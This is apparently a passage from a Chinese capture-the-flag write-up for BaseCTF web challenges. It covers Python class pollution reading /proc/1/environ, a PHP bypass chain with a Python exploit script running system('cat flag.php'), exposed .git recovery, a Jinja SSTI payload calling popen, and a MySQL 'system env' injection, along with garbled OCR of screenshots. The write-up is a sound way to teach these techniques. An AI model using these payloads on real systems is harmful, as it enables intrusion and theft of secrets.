            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/', methods=['GET', 'POST'])
def hello_world():
    return open('/static/index.html', encoding="utf-8").read()

@app.route('/read', methods=['GET', 'POST'])
def Read():
    file = open(__file__, encoding="utf-8").read()
    return f"J1ngHong说：你想read flag吗？
那么圣钥之光必将阻止你！
但是小小的源码没事，因为你也读不到flag(乐)
{file}
"

@app.route('/pollute', methods=['GET', 'POST'])
def Pollution():
    if request.is_json:
        merge(json.loads(request.data),instance)
    else:
        return "J1ngHong说：钥匙圣洁无暇，无人可以污染！"
    return "J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
```

其中 merge 代码是 python 原型链污染特征

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

污染全局变量  __FILE__

<!-- 这是一张图片，ocr 内容为：项目 查看 帮助 BURP SUITE专业版 V2024.2.1 - LICENSED TO LEON406 重放器 BURP INTRUDER 日志扩展扩展学习COLLABORATOR 编码工具 对比工具 SEQUENCER 目标 重放器 仪表盘 代理 ORGANIZER INTRUDER 1 X 发送 取消 请求 响应 IS                                                            页面渲染 美化 美化 HEX HEX RAW RAW HTTP/1.1 200  OK POST /POLLUTE HTTP/1.1 HOST:CHALLENGE.BASECTF.FUN:23588 SERVER:VERKZEUG/3.0.4 PYTHON/3.8.19 2345678 LUSER-AGENT: HOZILLA/5.0 (WINDOWS NT 10.0; WIN64; X64; IV:130.0) DATE:THU,19 SEP 2024 12:58:13 GHT GECKO/20100101 FIREFOX/130.0 CONTENT-TYPE:TEXT/HTML;CHARSET-UTF-8 CONTENT-LENGTH:65 ACCEPT: TEXT/HTML,APPLICATION/XHTML+XML+XML,APPLICATION/XML:Q,IMAGE/AVIF,IMAGE/UE CONNECTION: CLOSE BP,IMAGE/PNG,IMAGE/SVG+XML,*/*;Q-0.8 J1NGRHONGOOOO00000000000000 ACCEPT-LANGUAGE: ZH-CN,ZH;Q-0.8,ZH-TW;Q-0.7,ZH-HK;Q-0.5,EN-US;Q-0.3,EN;Q-0.2 ACCEPT-ENCODING: GZIP, DEFLATE, BR CONTENT-TYPE:APPLICATION/JSON CONTENT-LENGTH:59 9 ORIGIN:HTTP://CHALLENGE.BASECTF.FUN:23588 10 CONNECTION: CLOSE 11 REFERER: HTTP://CHALLENGE.BASECTF.FUN:23588/POLLUTE 12 UPGRADE-INSECURE-REQUESTS: 1 13 PRIORITY:U-0,I 14 15 ":{ INIT ":{ GLOBALS "/"/PROC/1/ENVIRON" 1 FILE -->


在环境变量中拿到 flag

<!-- 这是一张图片，ocr 内容为：E21E8E9AGZCTF FLAG-BASECTF[T1D7038A-904E-4B6B-9982-105068908058]G -->


# FIN
## 1z_php
e_m.p  使用 e[m.p 进行传参，intval 可以使用 数字 + 字母绕过，不过后面 ctype_alpha 匹配了字母，所以需要使用 8进制绕过 

```plain
payload：
?e[m.p=0337522
```

第二层 需要绕过 preg_match，即 preg_match 匹配不到 HACKER 但是 stripos 可以匹配到，使用回溯次数绕过

第三层 (new $a($b))->$c() 其中 b 的前三位必须为 php ，可以想到文件包含

```plain
SplFileObject("php://filter/read=convert.base64-encode/resource=index.php")
```

但是后面输出文件内容到函数，可以使用 fgets 

```plain
new SplFileObject("php://filter/read=convert.base64-encode/resource=index.php") -> fgets()
```

此时已经可以任意文件读取了，也可以命令执行

EXP：

```python
import requests

url = "http://challenge.basectf.fun:47750/"
payload_get = "?e[m.p=0337522&a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=index.php&c=fgets"

payload_post = {"try": "a" * 1000001 + "HACKER", "shell": "system('cat flag.php');"}

response = requests.post(url + payload_get, data=payload_post).text
print(response)
```

## Back to the future
使用 githacker 进行扫描 

<!-- 这是一张图片，ocr 内容为：ROOT@KALI:~/GITHACKER EDIT VIEW HELP ACTIONS FILE HELP EDIT VIEW ACTIONS 2024-09-19 09:26:07 ERROR [-1 H 1 -1 [-1 BYTES] COMMIT 9D85F10E0192EF630E10D7F .GIT/CONFIG 2024-09-19 09:26:07 ERROR FILEEXISTSERROR(17, 'FILE EXISTS') AUTHOR:KENGWANG <GITHUB@KENGW LISBMICEDA 2024-09-19 09:26:07 ERROR [70490 BYTES] 200 .GI 200 .GIT/REFS/HEADS/TESTING DATE: FRI AUG 23 02:33:20 'FILE EXISTS' 2024-09-19 09:26:07 ERROR FILEEXISTSERROR( OR(17 2024-09-19 09:26:07 ERROR [70486 BYTES] 200 .GIT/REFS/HEADS/WIP ADD WHAT 2024-09-19 09:26:07 ERROR /TMP/TMP2ZC8D60A/-GIT/HOOKS/APPLYPATCH-MSG S FILE AL DANGEROUS, SKIP DOWNLOADING THIS FI  POTENTIAL DAR 07 ERROR [-1 BYTES] -1 .GIT/HOOKS/APPLYPATCH-MSG. 2024-09-19 09:26:07 2024-09-19 09:26:07 ERROR /T /TMP/TMPZZCBD60A/ GIT/HOOKS/COMMIT-MSG IS POTENTIAL DANGEROUS, SKIP DOWNLOADING 2024-09-19 09:26:07 ERROR [-1 BYTES] -1 .GIT/ .GIT/HOOKS/COMMIT-MSG 2024-09-19 09:26:07 ERBOR /TEP//TIP// SKID DONKS/FSJANTIANITOF-MAN  1S POTENTIAL  DANSEROUS SHD SHIS FILE 2024-09-19 09:26:07 ERROR [-1 BYTES] -1 -GIT/HOOKS/FSMONITOR-WATCHMAN 2024-09-19 09:26:07 ERROR POTENTIAL DANGEROUS, SKIP DOWNLOADING THIS FILE /TMP/TMP2ZC8D60A/.GIT/HOOKS/POST-UPDATE IS 2024-09-19 09:26:07 ERROR [-1 BYTES] -1 /DESKTOP/ GIT/HOOKS/POST-UPDATE FILE ERROR 2024-09-1909:26:07 [-1 BYTES] GIT/HOOKS/PRE-APPLYPATCH 2024-09-19 09:26:07 ERROR /TMP/TMP2ZC8D60A/.GIT/HOOKS/PRE-COMMIT IS POT S FILE S POTENTIAL DANGEROUS, SKIP DOWNLOADING THIS FER 2024-09-19 09:26:07 ERROR [-1 BYTES] - 1 .GIT/HOOKS/PRE-COMMIT 2024-09-19 09:26:07 ERROR /TMP/TMP2ZC8D60A/.GIT/HOOKS/PRE-MERGE-COMMIT S POTENTIAL DANGEROUS, SKIP DOWNLOADING THIS FILE 1S 2024-09-19 09:26:07 ERROR [-1 BYTES] -1 -GIT/HOOKS/PRE-MERGE-COMMIT 2024-09-19 09:26:07 ERROR /TMP/TMP2ZC8D60A/.GIT/HOOKS/PRE-PUSH IS POTENTIAL  DANGEROUS, SKIP DOWNLOADING THIS FILE 2024-09-19 09:26:07 ERROR [-1 BYTES] -1 .G DIFF--GIT           DIFF --GIT A/READM -1 .GIT/HOOKS/PRE-PUSH /TMP/LMP2ZC8D6OA/,GIT/HOOKS/DRE-REBASE IS POTENTIAL DANGEROUS, SKIP DOWNLOADING THIS 2024-09-19 09:26:07 ERROR HIS FILE     INDEX 00000000000. [-1 BYTES] -1 .GIT/HOOKS/PRE-REBASE 2024-09-19 09:26:07 ERROR 0..0D2C09B /TMP/TMP2ZC8D60A/ GIT/HOOKS/PRE-RECEIVE IS POTENTIAL DANGEROUS, SKIP DOWNLOADING 2024-09-19 09:26:08 ERROR THIS FILE [-1 BYTES] -1 .GIT/HOOKS/PRE-RECEIVE 2024-09-19 09:26:08 ERROR 2024-09-19 09:26:08 ERROR /TMP/TMP2ZC8D60A/.GIT/HOOKS/PREPARE-COMMIT-MSG IS POTENTIAL DANGEROUS, SKIP DOWNLOADING THIS FILE 2024-09-19 09:26:08 ERROR [-1 BYTES] -1 -GIT/HOOKS/PREPARE-COMMIT-MSG 2024-09-19 09;28:0B ERROR /UP/LMO//WOZASO3/ STV/HOOKS/UPDATO 1S PATEATIAL DAUSEROUS, SKID  2024-09-19 09:26:08 ERROR [-1 BYTES] -1 .G3 GIT/HOOKS/UPDATE +INIS 15 MY WEB PROLECT. HEAD FILES... 2024-09-19 09:26:08 INFO DOWNLOADING NO NEWLINE AT END OF FILE [819 BYTES] -GIT/OBJECTS/E2/BC04BC70F7B7476AE7AD0E943EF62AA2B55556E 2024-09-19 09:26:08 INFO 200 [786 BYTES] 200 2024-09-19 09:26:08 INFO -(ROOT&KALI)-[DESKTOP/TES -GIT/OBJECTS/8F/7720B7891039B394E26E67FF10D6C6D2A144D5 2024-09-19 09:26:08 INFO 200 [817 BYTES] 一 GIT SHOW 9D85F10E0192EF630 GIT/0BJECTS/9D/85F10E0192EF630E10D7F876A117DB41C3041C30417 FILES.... 2024-09-19 09:26:08 INFO DOWNLOADING BLOB COMMIT 9D85F10E0192EF630E10D7F 2024-09-19 09:26:08 AUTHOR:KENGWANG <GITHUB@KENGW INFO [90 BYTES] 200 -GIT/OBJECTS/84/4C94EE77ED3AF5228BA639A34263ECB6F6F3EC :                                                                                                     2024-09-19 09:26:08 INFO RUNNING GIT FSCK FILES... DATE: 2024-09-19 09:26:08 INFO [54 BYTES] 200 GIT/OBJECTS/A2/63D2B1419F68B7DAEC9CEAAEBC6A70FC752E0B 2024-09-19 09:26:08 ADD WHAT 200 [86 BYTES] INFO -GIT/0BJECTS/B5/A27F2196DCEB21778F2D6C7D8536BDCA8534D2 2024-09-19 09:26:08 INFO [54 BYTES] 200 GIT/0BJECTS/FF/3E9E18C3C3A95ACAAD47BEB94467B15CAED3ED3E4  DIFF -GIT A/FLAG.TXT B/FLAG.T 2024-09-19 09:26:08 INFO [51 BYTES] 200 -GIT/OBJECTS/0D/2C096960C9E912FE9404A3C36BD7EC2DBB080E 2024-09-19 09:26:08 INFO W FILE MODE 100644 200 -GIT/OBJECTS/DB/8621D3EBDDDD6826EE6F2583A6E4F56B3E9A736 [61 BYTES] INFO CLONING DOWNLOADED REPO FROM /TMP/TMP2ZC8D60A TO /N 2024-09-19 TO /ROOT/DESKTOP/TEST/3403BABC217A13260456E4AB24A11E5A 09:26:08 2024-09-19 09:26:08 ERROR CLONING INTO '/ROOT/DESKTOP/TEST/3403BABC217A13260456E4AB24A11E5A /DEV/NULT B/FLAG.TXT DONE. 2024-99-19 09:26:08 INFO CHECK IT OUT: /ROOT/DESKTOP/TEST/3403BABC217A13260456EGAB24AB24ALLE5A 2024-09-19 09:26:08 INFO 1 / 1 WERE EXPLOITED SUCCESSFULLY INFO HTTP://CHALLENGE.BASECTF.FUN:46422/.GIT /ROOT/DESKTOP/TEST/3403BABC217A13260456E4AB24A11E5A 2024-09-19 09:26:08 -->


git show 查看到 flag

<!-- 这是一张图片，ocr 内容为：(R00TS KALI)-[~/DESKTOP/TEST/3403BABC217A13260456E4AB24A11E5A/.G 5A/GIT GIT SHOW 9D85F10E0192EF630E10D7F876A117DB41C30417 QUIETER COMMIT 9D85F10E0192EF630E10D7F876A117DB41C30417 <GITHUB@KENGWANG.COM.CN> AUTHOR:KENGWANG <GII FRI AUG  23 02:34:332024+0800 DATE: ADD WHAT DIFF A/FLAG.TXT B/FLAG.TXT -GITA E MODE 100644 NEW FILEM INDEX 0000000...DB8B21D /DEV/NULL +HT B/FLAG.TXT @A-0,0 +1 AM +BASECTF{1AA62024-5A12-4F55-80FA-CB9C41E1154B} FILE , NO NEWLINE AT END OF -->


## Jinja Mark
lucky_number 可以使用 bp 的数值爆破获取

<!-- 这是一张图片，ocr 内容为：项目 查看 BURP SUITE专业版 V2024.2.1 - B时项目 - ICENSED TO LEON406 O 重放器 帮助 X BURP INTRUDER 日志  扩展 学习 COLLABORATORATORGANIZER O搜索@设置 对比工具 目标 编码工具 重放器 仪表盘 代理 O X X 位置 设置 资源池 PAYIOAD PAYLOAD集 开始攻击 您可以定义一个或多个有PAYLOAD集.PAYLOAD集 PAYLOAD年: PAYLOAD数量:9.000 PAYLOAD类型: 数值 9.000 请求数量: PAYLOAD SETTINGS[NUMBERS] 生成给定范围内指定格式的有效数值内容. 数字范围 类型: 随机 SEQUENTIAL 从: 1000 到(TO) 9999 问题: 数量: 数值格式 十进制 基数(BASE): HEX 整数最小位数: O 整数最大位数: 4 0 小数最小位数: O 小数最大位数: 示例 4321 PAYLOAD处理 您可以定义在使用PAYLOAD之前对每个PAYLOAD执行各种处理任务的规则. EVENT LOG(12) 内存:234.0MB -->


<!-- 这是一张图片，ocr 内容为：你不会以为这里真的有FLAG吧? 想要FLAG的话先猜猜我的幸运数字 用POST方式把LUCKY NUMBER 告诉我吧,只有四位数哦 BLACKLIST_IN_INDEX : ['']']'] DEF MERGE(SRC, DST): FOR K, V IN SRC.ITEMS(): IF HASATTR(DST, _GETITEM IF DST.GET(K) AND TYPE(V)-- DICT: MERGE(V,DST.GET(K)) E1SE: DST[K] V TYPE(V) ELIF HASATTR(DST, K) AND TY 三 DICT: MERGE(V, GETATTR(DST, K)) E1SE: SETATTR(DST, K, V) GET'] @APP.ROUTE(/MAGIC',METHODS[POST', DEF POLLUTE(): IF REQUEST.METHOD -:'POST': IF REQUEST.IS_JSON: MERGE(JSON.LOADS(REQUEST.DATA), INSTANCE) "这个魔术还行吧" RETURN ELSE: "我要JSON的魔术" RETURN "日但用NOTT如藤术太下击" 高亮全部(A) 匹配变音符号(I) 区分大小写(C) BASE 无障碍环境 竹网络{}样式编辑器 调试器 查看器 性能非内存目存储 控制台 ENCODING ENCRYPTION OTHER LFI XSS SQL XXE HTTP://CHALLENGE.BASECTF.FUN:37777/FLAG LOAD URL SPLIT URL EXECUTE USER AGENT CLEAR ALL REFERER POST DATA COOKIES ADDIP LUCKY NUMBER5346 -->


分析这里的代码，是一个 原型链污染，根据题目的信息应该是需要从 /magic 路由进行原型链污染，将 BLACKLIST_IN_index 进行污染，然后在 /index 中进行 SSTI 注入

尝试全局污染

<!-- 这是一张图片，ocr 内容为：请求 美化 RAW HEX POST/MAGIC HTTP/1.1 23 HOST:CHALLENGE.BASECTF.FUN:37777 LUSER-AGENT: HOZILLA/S.0 (WINDOWS NT 10.0; WIN64; X64; RV:130.0) GECKO/20100101 FIREFOX/130.0 ACCEPT: TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;Q-0.9,IMAGE/AVI BP,IMAGE/PNG,IMAGE/SVG+XML,*/*;Q-0.8 ACCEPT-LANGUAGE: 2H-CN,ZH;Q-0.8,ZH-TW;Q-0.7,ZH-HK;Q-0.5,EN-US;Q-0.3,EN;Q-2 ACCEPT-ENCODING: GZIP, DEFLATE, BR CONTENT-TYPE:APPLICATION/JSON CONTENT-LENGTH:54 9 ORIGIN:HTTP://CHALLENGE.BASECTF.FUN:37777 10 CONNECTION:CLOSE REFERER: HTTP://CHALLENGE.BASECTF.FUN:377/MAGIC 11 12 UPGRADE-INSECURE-REQUESTS: L 13 PRIORITY: U-0, I 14 15 INIT ":( GLOBALS "BLACKLIST IN INDEX":"" -->


在 /index 进行 SSTI，发现污染成功了

<!-- 这是一张图片，ocr 内容为：CHALLENGE.BASECTF.FUN:3777/INDEX HELLO 49 -->


直接进行 SSTI

```python
{{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read()}}
```

## RCE or Sql Inject
RCE，使用的是 mysql 的特性 system 进行命令执行

<!-- 这是一张图片，ocr 内容为：MYSQ1> FOR INFORMATION ABOUT MY OUT MYSQL PRODUCTS AND SERVICES, VISIT: HTTP://WWW.MYSGL.COM/ FOR DEVELOPER INFORMATION. INCLUDING THE NYSOL REFERENCE MANUAL, VISIT: HTTP://DEV.MYSGL.COM/ BUY MYSOL ENTERPRISE SUPPORT, TRAINING. OR OTHER DRODUCTS. VISIT:372 访客53729 HTTPS://SHOP.MYSQL.COM/ LIST OF ALL MYSQL COMMANDS: NOTE THAT ALL TEXT COMMANDS MUST BE FIRST ON LINE AND END WITH (\?) SYNONYM FOR OR HELP (OV CLEAR THE CURRENT INPUT STATEMENT. LEAR (AR) RECONNECT TO THE SERVER. OPTIONAL ARGUMENTS ARE DB AND HOST. CONNECT (P) SET STATEMENT DELIMITER. DELIMITER 访客 53729 SEND COMMAND TO MYSQL SERVER, DISPLAY R (AG) RESULT VERTICALLY. EGO EXIT MYSQL. SAME AS QUIT. (IG) EXIT SEND COMMAND TO MYSQL SERVER. ((G) GO (() DISPLAY THIS HE LP. HELP DON'T WRITE INTO OUTFILE. (() NOTEE PRINT CURRENT COMMAND. (D) PRINT PROMPT 72 (\R) CHANGE YOUR MYSQL PROMPT. (\G) QUIT MYSQL. 访客53729 访客53729 QUIT (\) REBUILD COMPLETION HASH. REHASH (\.) EXECUTE AN SOL SCRIPT FILE. TAKES A FILE NAME AS AN ARGUMENT SOURCE GET STATUS INFORMATION FROM THE SERVER. (SV) STATUS EXECUTE A SYSTEM SHELL COMMAND. (I) SYSTEM SET OUTFILE [TO_OUTFILE]. APPEND EVERYTHING INTO GIVEN OUT (VT) TEE IN OUTFILE. (V) USE ANOTHER DATABASE. TAKES DATABASE NAME AS ARGUMENT. USE SWITCH TO ANOTHER CHARSET. MIGHT BE NEEDED FOR PROCESSING BINLOG WITH MULTI-BYTE CHARSETS ((() CHARSET SHOW WARNINGS AFTER EVERY STATEMENT. (M) WARNINGS NOWARNING (\W) DON'T SHOW WARNINGS AFTER EVERY STATEMENT. (\X) CLEAN SESSION CONTEXT. RESETCONNECTION(\X) QUERY ATTRIBUTES SETS STRING PARAMETERS (NAMEL VALUEL NAME2 VALUE2 FOR THE NEXT QUERY TO PICK UP. OUT OR FILE SSI-SESSION-DATA-PRINT SERIALIZES THE CURRENT SSL SESSION DATA TO STDOUT SERVER SIDE HELP, TYPE 'HELP CONTENTS' 访客 53729 访客53729 MYSG -->


payload：

```plain
%0a system env
```

<!-- 这是一张图片，ocr 内容为：CAN'T SUCCEED THIS TIME! HAHAHA -->


## ez_php
## cml
